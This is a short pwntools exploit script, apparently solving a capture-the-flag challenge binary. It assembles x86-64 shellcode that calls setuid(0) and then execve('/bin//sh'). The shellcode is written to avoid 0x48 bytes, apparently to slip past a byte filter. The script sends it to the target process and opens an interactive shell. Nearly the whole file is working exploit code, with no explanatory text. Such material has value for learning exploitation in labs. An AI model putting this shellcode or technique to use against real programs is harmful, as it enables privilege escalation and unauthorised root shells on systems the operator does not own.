#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = "debug"

target_binary = "/challenge/ello-ackers"

shellcode_asm = """
.global _start
_start:
.intel_syntax noprefix
    xor edi, edi
    push 105
    pop rax
    syscall

    xor esi, esi
    push rsi
    push rsi
    push rsp
    pop rdi

    mov dword ptr [rdi], 0x6e69622f
    mov dword ptr [rdi+4], 0x68732f2f

    push 59
    pop rax

    xor edx, edx
    syscall
"""

payload = asm(shellcode_asm)
print(payload)

log.info(f"Payload len: {len(payload)} bytes")
log.info(f"Payload Hex dump: \n{enhex(payload)}")

if b"\x48" in payload:
    log.error("detected 0x48 bytes in payload")
    exit(1)

p = process(target_binary)
p.send(payload)
p.interactive()
